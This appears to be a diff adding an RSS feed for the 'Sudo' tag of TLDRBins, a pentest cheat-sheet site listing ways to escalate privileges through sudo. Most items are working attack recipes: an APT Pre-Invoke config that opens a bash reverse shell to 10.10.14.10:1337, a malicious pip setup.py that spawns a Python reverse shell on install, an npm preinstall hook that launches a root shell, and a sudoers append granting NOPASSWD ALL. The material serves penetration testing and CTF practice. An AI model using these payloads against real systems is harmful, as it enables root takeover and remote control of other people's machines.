@@ -1,0 +1,46 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Sudo on TLDRBins</title>
+    <link>https://tldrbins.github.io/@sudo/</link>
+    <description>Recent content in Sudo on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@sudo/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Apt</title>
+      <link>https://tldrbins.github.io/apt/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/apt/</guid>
+      <description> MITM (Man-in-the-Middle) 1. Add proxy path in target machine export http_proxy=http://10.10.14.10:8888 2. Start proxy in local machine # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port 8888 3. Redirect traffic to our server # Edit /etc/hosts 10.10.14.10 apt.update.example.com SUDO # Create a malicious config echo &amp;#39;APT::Update::Pre-Invoke {&amp;#34;bash -c &amp;#39;\&amp;#39;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.10/1337 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#39;&amp;#39;&amp;#34;}&amp;#39; &amp;gt; /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y </description>
+    </item>
+    <item>
+      <title>git</title>
+      <link>https://tldrbins.github.io/git/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/git/</guid>
+      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;lt;BRANCH_NAME&amp;gt; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;lt;COMMIT_HASH&amp;gt; SUDO # Copy target project cp -r /var/www/html/project .</description>
+    </item>
+    <item>
+      <title>npm</title>
+      <link>https://tldrbins.github.io/npm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/npm/</guid>
+      <description> SUDO Create a package.json&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
+    </item>
+    <item>
+      <title>pip</title>
+      <link>https://tldrbins.github.io/pip/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pip/</guid>
+      <description> SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
+    </item>
+    <item>
+      <title>sudoers</title>
+      <link>https://tldrbins.github.io/sudoers/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sudoers/</guid>
+      <description> Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
+    </item>
+  </channel>
+</rss>
